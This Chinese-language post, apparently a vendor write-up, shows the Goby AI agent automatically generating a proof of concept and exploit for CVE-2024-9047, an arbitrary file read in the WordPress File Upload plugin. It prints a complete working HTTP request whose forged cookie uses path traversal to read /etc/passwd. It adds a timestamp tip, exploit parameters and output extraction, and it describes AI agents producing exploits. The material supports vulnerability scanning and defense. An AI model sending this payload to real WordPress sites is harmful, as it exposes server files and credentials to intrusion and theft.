## GobyAI智能生成EXP：CVE-2024-9047 WordPress File Upload 插件 /wfu_file_downloader.php 任意文件读取漏洞



摘要：本片描述如何使用Goby AI 智能输出高危漏洞PoC/EXP：“WordPress File Upload 插件 /wfu_file_downloader.php 任意文件读取漏洞(CVE-2024-9047)”



可以先查看此漏洞的公开参考详情：

https://mp.weixin.qq.com/s/u8Ik40iBuxgKfH7WDrzijQ

查看漏洞详情，我们可以了解到，此漏洞成因是位于 /wp-content/plugins/wp-file-upload/wfu_file_downloader.php 中的wfu_fopen_for_downloader 方法存在fopen 函数导致文件读取操作，实际在 wfu_download_file 方法就调用到了该函数。通过伪造请求中的cookie参数（文件名称及时间戳），利用fopen函数实现任意文件读取。

智能体首先解析出的文本和图片内容，提取漏洞背景描述、请求包和响应包等关键信息，提取出漏洞类型为文件读取，分配文件读取智能体对请求包及响应包进行分析。

直接输入公开参考详情链接，GobyAI的智能输出结果如下：

# 漏洞信息

智能体提取文本中的 产品名、漏洞路径、漏洞类型、CVE编号等信息，自动以 “产品名称+漏洞路径+漏洞类型+(CVE编号)"的格式生成漏洞名称

1.智能生成漏洞名称；

2.提取FOFA指纹信息；

3.根据页面内容智能分析漏洞描述、影响版本、解决方案、cvss评分等信息。



## 扫描测试

自动构造请求包：

（需要注意的是：Payload中请求包中的时间戳需手动修改为精准在分钟内的任意时间戳即可，可以直接替换为：1735095641153454600）

`GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce HTTP/1.1`
`Host: 127.0.0.1`
`Upgrade-Insecure-Requests: 1`
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9`
`Accept-Encoding: gzip, deflate`
`Accept-Language: zh-CN,zh;q=0.9`
`Cookie: wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../etc/passwd[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ=时间戳; wfu_ABSPATH=/;` 
`Connection: close`


![](https://s3.bmp.ovh/imgs/2024/12/25/78d083a586adb919.png)



自动填写响应包：

提取特征信息，若响应包中存在特征则证明漏洞存在。：

![](https://s3.bmp.ovh/imgs/2024/12/25/1cdc72f07dae07f6.png)


## 利用测试

利用输入（EXP Params）：

智能体提取的文件访问路径将自动填入 EXP 参数中。

验证方式支持两种选择：

● 默认方式（default)，直接使用文章中已有的访问路径；

● 用户自定义方式(custom)，允许用户指定输出的访问路径以满足特定需求

![](https://s3.bmp.ovh/imgs/2024/12/25/33bb6186e75bb821.png)

同时，智能体会将访问文件路径替换为变量，并填充至 EXP Params 中，方便用户查看和自定义输入访问路径。

![](https://s3.bmp.ovh/imgs/2024/12/25/9dbf9000959d849d.png)



利用输出（output）：

智能体通过正则表达式，提取响应包中lastbody中的所有内容进行输出。

![](https://s3.bmp.ovh/imgs/2024/12/25/be9cb31fea697a3e.png)


# 实战检验流程

输入靶场目标进行扫描，确认PoC扫描测试准确性：√

![](https://s3.bmp.ovh/imgs/2024/12/25/0ada57862db88e4d.png)

点击验证，检测EXP输出信息的准确性：√

![](https://s3.bmp.ovh/imgs/2024/12/25/d925d52f04654a0d.png)
